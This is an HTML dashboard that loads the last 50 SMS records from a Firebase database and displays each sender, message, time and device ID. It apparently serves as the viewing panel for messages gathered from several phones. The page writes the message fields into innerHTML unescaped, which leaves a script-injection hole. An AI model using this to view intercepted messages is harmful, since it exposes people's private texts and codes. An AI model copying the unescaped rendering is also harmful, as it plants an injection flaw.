<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>All SMS - Live Feed</title>
    <style>
        body {
            font-family: system-ui, -apple-system, sans-serif;
            background-color: #0f172a;
            color: #f8fafc;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #334155;
            padding-bottom: 10px;
            margin-bottom: 20px;
        }
        .back-btn {
            color: #94a3b8;
            text-decoration: none;
            font-size: 0.9rem;
            padding: 6px 14px;
            border: 1px solid #334155;
            border-radius: 8px;
            transition: 0.2s;
        }
        .back-btn:hover {
            border-color: #10b981;
            color: #10b981;
        }
        .sms-card {
            background-color: #1e293b;
            border: 1px solid #334155;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 15px;
            animation: fadeIn 0.2s ease-in;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .meta {
            display: flex;
            justify-content: space-between;
            font-size: 0.85rem;
            color: #10b981;
            margin-bottom: 8px;
            font-weight: bold;
        }
        .time {
            color: #94a3b8;
            font-weight: normal;
        }
        .msg {
            margin: 0;
            line-height: 1.5;
            white-space: pre-wrap;
            font-size: 0.95rem;
        }
        .info {
            font-size: 0.75rem;
            color: #64748b;
            margin-top: 8px;
            border-top: 1px dashed #334155;
            padding-top: 5px;
        }
        .device-id {
            font-size: 0.7rem;
            color: #475569;
            background: #0f172a;
            padding: 2px 8px;
            border-radius: 4px;
        }
        .loading {
            color: #94a3b8;
            text-align: center;
            padding: 20px;
        }
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid #334155;
            border-top: 2px solid #10b981;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 10px;
            vertical-align: middle;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status-badge {
            font-size: 0.75rem;
            padding: 4px 10px;
            border-radius: 20px;
            background: #1e293b;
            color: #94a3b8;
            border: 1px solid #334155;
        }
        .error {
            color: #ef4444;
            padding: 20px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div>
                <a href="index.html" class="back-btn">← Back</a>
                <span style="margin-left: 12px;">📨 All SMS</span>
            </div>
            <span id="counter" class="status-badge">Loading...</span>
        </div>
        <div id="sms-container">
            <div class="loading">
                <span class="spinner"></span>
                Loading messages...
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { 
            getDatabase, 
            ref, 
            onValue, 
            query, 
            limitToLast, 
            orderByKey 
        } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        const container = document.getElementById('sms-container');
        const counter = document.getElementById('counter');

        const app = initializeApp({
            databaseURL: "https://YOUR_PROJECT_ID-default-rtdb.firebaseio.com"
        });
        const db = getDatabase(app);

        // Limit data fetching to the last 50 items directly on the server side
        const smsRef = ref(db, 'common/smsData');
        const recentSmsQuery = query(smsRef, orderByKey(), limitToLast(50));

        function createSmsCard(sms) {
            const sender = sms.sender || "Unknown";
            const message = sms.message || "";
            const time = sms.time || "N/A";
            const info = sms.info || "";
            const deviceId = sms.deviceId || "";

            const card = document.createElement('div');
            card.className = 'sms-card';
            card.innerHTML = `
                <div class="meta">
                    <span>📨 ${sender}</span>
                    <span class="time">🕐 ${time}</span>
                </div>
                <p class="msg">${message}</p>
                ${info ? `<div class="info">⚙️ ${info}</div>` : ''}
                ${deviceId ? `<div class="info">📱 Device: <span class="device-id">${deviceId}</span></div>` : ''}
            `;
            return card;
        }

        onValue(recentSmsQuery, (snapshot) => {
            const data = snapshot.val();
            
            if (!data) {
                container.innerHTML = '<div class="error">📭 No messages found</div>';
                counter.textContent = '0 messages';
                return;
            }

            // Convert map to array and reverse so newest messages appear at the top
            const messages = Object.values(data).reverse();

            counter.textContent = `${messages.length} recent messages`;
            container.innerHTML = '';
            
            const fragment = document.createDocumentFragment();
            for (const sms of messages) {
                fragment.appendChild(createSmsCard(sms));
            }
            container.appendChild(fragment);

        }, (error) => {
            console.error('Error:', error);
            container.innerHTML = `<div class="error">❌ ${error.message}</div>`;
            counter.textContent = 'Error';
        });
    </script>
</body>
</html>
